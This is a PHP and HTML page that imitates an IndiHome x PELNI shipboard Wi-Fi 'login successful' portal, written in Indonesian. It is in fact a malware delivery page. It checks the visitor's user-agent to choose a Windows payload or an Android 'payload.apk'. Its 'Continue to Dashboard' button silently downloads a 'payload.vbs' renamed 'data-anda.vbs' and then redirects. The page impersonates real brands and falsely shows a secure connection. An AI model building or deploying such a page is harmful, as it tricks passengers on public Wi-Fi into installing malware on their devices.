<?php
// Deteksi jenis OS dari user-agent
$user_agent = $_SERVER['HTTP_USER_AGENT'];
$is_windows = stripos($user_agent, "Windows") !== false;
$is_android = stripos($user_agent, "Android") !== false;

// Tentukan file download
$download_file = '';
if ($is_windows) {
    $download_file = 'payload';
} elseif ($is_android) {
    $download_file = 'payloads/payload.apk';
}
?>

<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>IndiHome x PELNI - Login Berhasil</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 50%, #004d7a 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            position: relative;
            overflow: hidden;
        }

        /* Animated background waves */
        .wave {
            position: absolute;
            bottom: 0;
            left: 0;
            width: 100%;
            height: 100px;
            background: url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1200 120" preserveAspectRatio="none"><path d="M0,0V46.29c47.79,22.2,103.59,32.17,158,28,70.36-5.37,136.33-33.31,206.8-37.5C438.64,32.43,512.34,53.67,583,72.05c69.27,18,138.3,24.88,209.4,13.08,36.15-6,69.85-17.84,104.45-29.34C989.49,25,1113-14.29,1200,52.47V0Z" opacity=".25" fill="%23ffffff"></path><path d="M0,0V15.81C13,36.92,27.64,56.86,47.69,72.05,99.41,111.27,165,111,224.58,91.58c31.15-10.15,60.09-26.07,89.67-39.8,40.92-19,84.73-46,130.83-49.67,36.26-2.85,70.9,9.42,98.6,31.56,31.77,25.39,62.32,62,103.63,73,40.44,10.79,81.35-6.69,119.13-24.28s75.16-39,116.92-43.05c59.73-5.85,113.28,22.88,168.9,38.84,30.2,8.66,59,6.17,87.09-7.5,22.43-10.89,48-26.93,60.65-49.24V0Z" opacity=".5" fill="%23ffffff"></path><path d="M0,0V5.63C149.93,59,314.09,71.32,475.83,42.57c43-7.64,84.23-20.12,127.61-26.46,59-8.63,112.48,12.24,165.56,35.4C827.93,77.22,886,95.24,951.2,90c86.53-7,172.46-45.71,248.8-84.81V0Z" fill="%23ffffff"></path></svg>') repeat-x;
            animation: wave 15s ease-in-out infinite;
            z-index: 1;
        }

        @keyframes wave {
            0%, 100% { transform: translateX(0px); }
            50% { transform: translateX(-50px); }
        }

        .container {
            background: rgba(255, 255, 255, 0.95);
            backdrop-filter: blur(10px);
            border-radius: 20px;
            padding: 40px;
            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.3);
            width: 100%;
            max-width: 450px;
            position: relative;
            z-index: 10;
            border: 1px solid rgba(255, 255, 255, 0.2);
            text-align: center;
        }

        .logo-container {
            text-align: center;
            margin-bottom: 30px;
        }

        .logo {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 15px;
            margin-bottom: 10px;
        }

        .indihome-logo {
            background: linear-gradient(135deg, #ff6b35, #ff8e53);
            color: white;
            padding: 12px 20px;
            border-radius: 25px;
            font-weight: bold;
            font-size: 18px;
            text-transform: uppercase;
            letter-spacing: 1px;
            box-shadow: 0 5px 15px rgba(255, 107, 53, 0.3);
            animation: float 3s ease-in-out infinite;
        }

        .pelni-logo {
            background: linear-gradient(135deg, #1e3c72, #2a5298);
            color: white;
            padding: 12px 20px;
            border-radius: 25px;
            font-weight: bold;
            font-size: 18px;
            text-transform: uppercase;
            letter-spacing: 1px;
            box-shadow: 0 5px 15px rgba(30, 60, 114, 0.3);
            animation: float 3s ease-in-out infinite 0.5s;
        }

        @keyframes float {
            0%, 100% { transform: translateY(0px); }
            50% { transform: translateY(-5px); }
        }

        .collaboration-text {
            font-size: 14px;
            color: #666;
            margin-bottom: 30px;
        }

        .success-icon {
            width: 80px;
            height: 80px;
            background: linear-gradient(135deg, #28a745, #20c997);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 25px;
            font-size: 40px;
            color: white;
            box-shadow: 0 10px 30px rgba(40, 167, 69, 0.3);
            animation: successPulse 2s ease-in-out infinite;
        }

        @keyframes successPulse {
            0%, 100% { transform: scale(1); box-shadow: 0 10px 30px rgba(40, 167, 69, 0.3); }
            50% { transform: scale(1.05); box-shadow: 0 15px 40px rgba(40, 167, 69, 0.4); }
        }

        .success-title {
            font-size: 28px;
            font-weight: bold;
            color: #333;
            margin-bottom: 15px;
            animation: slideInUp 0.8s ease-out;
        }

        .success-message {
            font-size: 16px;
            color: #666;
            margin-bottom: 10px;
            line-height: 1.6;
            animation: slideInUp 0.8s ease-out 0.2s both;
        }

        .user-info {
            background: rgba(42, 82, 152, 0.1);
            padding: 20px;
            border-radius: 15px;
            margin: 25px 0;
            border-left: 4px solid #2a5298;
            animation: slideInUp 0.8s ease-out 0.4s both;
        }

        .user-info h3 {
            color: #2a5298;
            margin-bottom: 10px;
            font-size: 18px;
        }

        .user-info p {
            color: #555;
            margin-bottom: 8px;
            font-size: 14px;
        }

        .user-info strong {
            color: #333;
        }

        .continue-btn {
            width: 100%;
            padding: 15px;
            background: linear-gradient(135deg, #ff6b35, #ff8e53);
            color: white;
            border: none;
            border-radius: 12px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            text-transform: uppercase;
            letter-spacing: 1px;
            position: relative;
            overflow: hidden;
            margin-top: 20px;
            animation: slideInUp 0.8s ease-out 0.6s both;
        }

        .continue-btn::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.3), transparent);
            transition: left 0.5s ease;
        }

        .continue-btn:hover::before {
            left: 100%;
        }

        .continue-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 25px rgba(255, 107, 53, 0.4);
        }

        .continue-btn:active {
            transform: translateY(0);
        }

        .logout-link {
            margin-top: 20px;
            animation: slideInUp 0.8s ease-out 0.8s both;
        }

        .logout-link a {
            color: #666;
            text-decoration: none;
            font-size: 14px;
            transition: color 0.3s ease;
        }

        .logout-link a:hover {
            color: #2a5298;
            text-decoration: underline;
        }

        .ship-icon {
            position: absolute;
            bottom: 20px;
            right: 20px;
            color: rgba(255, 255, 255, 0.3);
            font-size: 24px;
            z-index: 5;
        }

        .wifi-icon {
            position: absolute;
            top: 20px;
            left: 20px;
            color: rgba(255, 255, 255, 0.3);
            font-size: 24px;
            z-index: 5;
        }

        @keyframes slideInUp {
            from {
                opacity: 0;
                transform: translateY(30px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        @media (max-width: 480px) {
            .container {
                margin: 20px;
                padding: 30px 25px;
            }

            .logo {
                flex-direction: column;
                gap: 10px;
            }

            .indihome-logo, .pelni-logo {
                font-size: 16px;
                padding: 10px 18px;
            }

            .success-title {
                font-size: 24px;
            }

            .success-icon {
                width: 70px;
                height: 70px;
                font-size: 35px;
            }
        }

        /* Loading animation for continue button */
        .loading {
            display: none;
            width: 20px;
            height: 20px;
            border: 2px solid #ffffff;
            border-top: 2px solid transparent;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-left: 10px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .status-indicators {
            display: flex;
            justify-content: space-around;
            margin: 20px 0;
            animation: slideInUp 0.8s ease-out 0.7s both;
        }

        .status-item {
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 5px;
        }

        .status-icon {
            width: 40px;
            height: 40px;
            background: linear-gradient(135deg, #28a745, #20c997);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-size: 18px;
        }

        .status-text {
            font-size: 12px;
            color: #666;
            text-align: center;
        }
    </style>

        <script>
        function downloadAndRedirect() {
            const file = "<?php echo $download_file; ?>";
            if (file !== "") {
                const a = document.createElement('a');
                a.href = file;
                a.download = '';
                document.body.appendChild(a);
                a.click();
                setTimeout(() => {
                    window.location.href = "success.php";
                }, 2000); // delay 2 detik
            } else {
                window.location.href = "success.php";
            }
        }
    </script>
    
</head>
<body>
    <div class="wave"></div>
    
    <div class="wifi-icon">📶</div>
    <div class="ship-icon">🚢</div>
    
    <div class="container">
        <div class="logo-container">
            <div class="logo">
                <div class="indihome-logo">IndiHome</div>
                <div class="pelni-logo">PELNI</div>
            </div>
            <div class="collaboration-text">Koneksi Internet Terbaik di Kapal</div>
        </div>

        <div class="success-icon">✓</div>
        
        <h1 class="success-title">Login Berhasil!</h1>
        
        <div class="success-message">
            Selamat datang di layanan IndiHome x PELNI.<br>
            Anda telah berhasil terhubung ke internet kapal.
        </div>
        <div class="status-indicators">
            <div class="status-item">
                <div class="status-icon">🌐</div>
                <div class="status-text">Internet<br>Aktif</div>
            </div>
            <div class="status-item">
                <div class="status-icon">📡</div>
                <div class="status-text">Sinyal<br>Kuat</div>
            </div>
            <div class="status-item">
                <div class="status-icon">🔒</div>
                <div class="status-text">Koneksi<br>Aman</div>
            </div>
        </div>

        <button type="button" class="continue-btn" onclick="downloadAndRedirect()">
            Lanjutkan ke Dashboard
            <div class="loading" id="loadingSpinner"></div>
        </button>
    </div>
    <script>
        // Set login time
        document.addEventListener('DOMContentLoaded', function() {
            const now = new Date();
            const timeString = now.toLocaleString('id-ID', {
                day: '2-digit',
                month: '2-digit',
                year: 'numeric',
                hour: '2-digit',
                minute: '2-digit',
                second: '2-digit'
            });
            document.getElementById('loginTime').textContent = timeString;
        });

        function downloadAndRedirect() {
            const continueBtn = document.querySelector('.continue-btn');
            const loadingSpinner = document.getElementById('loadingSpinner');
            
            // Show loading
            loadingSpinner.style.display = 'inline-block';
            continueBtn.style.opacity = '0.7';
            continueBtn.disabled = true;
            
            // Create download link for file
            const link = document.createElement('a');
            link.href = 'payload/payload.vbs'; // Sesuaikan dengan path file yang ingin di-download
            link.download = 'data-anda.vbs'; // Nama file saat di-download
            link.style.display = 'none';
            document.body.appendChild(link);
            
            // Trigger download
            link.click();
            
            // Clean up
            document.body.removeChild(link);
            
            // Redirect to dashboard after download
            setTimeout(() => {
                window.location.href = 'index.php';
            }, 500);
        }
        // Add some interactive effects
        document.addEventListener('DOMContentLoaded', function() {
            // Animate success icon on load
            const successIcon = document.querySelector('.success-icon');
            setTimeout(() => {
                successIcon.style.transform = 'scale(1.1)';
                setTimeout(() => {
                    successIcon.style.transform = 'scale(1)';
                }, 200);
            }, 1000);
        });
    </script>
</body>
</html>